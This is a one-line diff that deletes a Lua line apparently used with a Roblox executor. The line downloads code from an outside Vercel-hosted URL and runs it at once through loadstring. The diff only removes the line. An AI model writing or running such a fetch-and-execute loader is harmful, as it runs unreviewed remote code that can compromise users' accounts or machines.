@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://season-ware.vercel.app"))()
